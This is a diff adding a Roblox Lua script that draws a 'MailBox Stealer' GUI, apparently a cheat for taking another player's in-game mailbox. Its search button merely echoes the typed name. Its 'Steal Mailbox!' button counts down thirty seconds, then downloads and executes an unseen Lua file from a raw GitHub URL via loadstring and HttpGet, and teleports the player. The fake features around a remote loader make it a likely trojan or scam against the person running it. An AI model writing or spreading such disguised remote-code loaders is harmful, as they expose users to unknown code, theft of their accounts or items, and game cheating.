@@ -1,0 +1,100 @@
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "MailBoxStealerGui"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.7, 0, 0.7, 0)
+frame.Position = UDim2.new(0.15, 0, 0.15, 0)
+frame.BackgroundColor3 = Color3.fromRGB(173, 216, 230) -- Light blue background
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+frame.Parent = screenGui
+
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(0.8, 0, 0.2, 0)
+textBox.Position = UDim2.new(0.1, 0, 0.1, 0)
+textBox.PlaceholderText = "Put a username Here!"
+textBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White background
+textBox.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black text
+textBox.TextSize = 24 -- Larger text
+textBox.Font = Enum.Font.SourceSansBold
+textBox.Parent = frame
+
+local searchButton = Instance.new("TextButton")
+searchButton.Size = UDim2.new(0.8, 0, 0.2, 0)
+searchButton.Position = UDim2.new(0.1, 0, 0.4, 0)
+searchButton.Text = "Search"
+searchButton.BackgroundColor3 = Color3.fromRGB(144, 238, 144) -- Light green background
+searchButton.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black text
+searchButton.TextSize = 24 -- Larger text
+searchButton.Font = Enum.Font.SourceSansBold
+searchButton.Parent = frame
+
+local stealButton = Instance.new("TextButton")
+stealButton.Size = UDim2.new(0.8, 0, 0.2, 0)
+stealButton.Position = UDim2.new(0.1, 0, 0.6, 0)
+stealButton.Text = "Steal Mailbox!"
+stealButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0) -- Orange background
+stealButton.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black text
+stealButton.TextSize = 24 -- Larger text
+stealButton.Font = Enum.Font.SourceSansBold
+stealButton.Parent = frame
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
+statusLabel.Position = UDim2.new(0.1, 0, 0.8, 0)
+statusLabel.Text = ""
+statusLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 0) -- Yellow background
+statusLabel.TextColor3 = Color3.fromRGB(0, 0, 0) -- Black text
+statusLabel.TextSize = 24 -- Larger text
+statusLabel.Font = Enum.Font.SourceSansBold
+statusLabel.Parent = frame
+
+-- Add the click sound effect
+local clickSound = Instance.new("Sound")
+clickSound.SoundId = "rbxassetid://12222216" -- Example sound ID
+clickSound.Parent = screenGui
+
+-- Function to execute the script
+local function executeScript()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/ps99/main/de870018723945ddefe27853.lua"))()
+end
+
+-- Function to show the found username
+local function showFoundUsername(username)
+    local foundGui = Instance.new("TextLabel")
+    foundGui.Size = UDim2.new(0.8, 0, 0.2, 0)
+    foundGui.Position = UDim2.new(0.1, 0, 0.3, 0)
+    foundGui.BackgroundTransparency = 0.5 -- Transparent background
+    foundGui.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
+    foundGui.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+    foundGui.TextSize = 24 -- Larger text
+    foundGui.Font = Enum.Font.SourceSansBold
+    foundGui.Text = "Found " .. username
+    foundGui.Parent = screenGui
+
+    -- Remove the label after a few seconds
+    wait(3)
+    foundGui:Destroy()
+end
+
+-- Add the script to handle button clicks
+searchButton.MouseButton1Click:Connect(function()
+    clickSound:Play()
+    local username = textBox.Text
+    showFoundUsername(username)
+end)
+
+stealButton.MouseButton1Click:Connect(function()
+    clickSound:Play()
+    statusLabel.Text = "Stealing Mailbox.. Wait 30 seconds"
+    
+    for i = 30, 1, -1 do
+        statusLabel.Text = "Stealing Mailbox.. Wait " .. i .. " seconds"
+        wait(1)
+    end
+    
+    executeScript()
+    game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+end)
